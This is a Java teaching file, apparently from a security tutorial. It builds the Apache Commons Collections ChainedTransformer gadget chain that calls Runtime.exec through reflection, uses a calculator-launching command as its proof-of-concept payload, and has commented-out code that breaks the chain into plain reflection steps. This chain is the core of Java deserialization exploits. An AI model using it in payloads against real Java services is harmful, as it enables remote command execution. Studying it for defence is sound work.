package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerTest {

	public static void main(String[] args) throws Exception {
		// 定义需要执行的本地系统命令
		String cmd = "open -a Calculator.app";

		// ChainedTransformer调用链分解

//		// new ConstantTransformer(Runtime.class
//		Class<?> runtimeClass = Runtime.class;
//
//		// new InvokerTransformer("getMethod", new Class[]{
//		// 		String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
//		// ),
//		Class  cls1       = runtimeClass.getClass();
//		Method getMethod  = cls1.getMethod("getMethod", new Class[]{String.class, Class[].class});
//		Method getRuntime = (Method) getMethod.invoke(runtimeClass, new Object[]{"getRuntime", new Class[0]});
//
//		// new InvokerTransformer("invoke", new Class[]{
//		// 		Object.class, Object[].class}, new Object[]{null, new Object[0]}
//		// )
//		Class   cls2         = getRuntime.getClass();
//		Method  invokeMethod = cls2.getMethod("invoke", new Class[]{Object.class, Object[].class});
//		Runtime runtime      = (Runtime) invokeMethod.invoke(getRuntime, new Object[]{null, new Class[0]});
//
//		// new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
//		Class  cls3       = runtime.getClass();
//		Method execMethod = cls3.getMethod("exec", new Class[]{String.class});
//		execMethod.invoke(runtime, cmd);

		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 执行对象转换操作
		Object transform = transformedChain.transform(null);

		System.out.println(transform);
	}

}
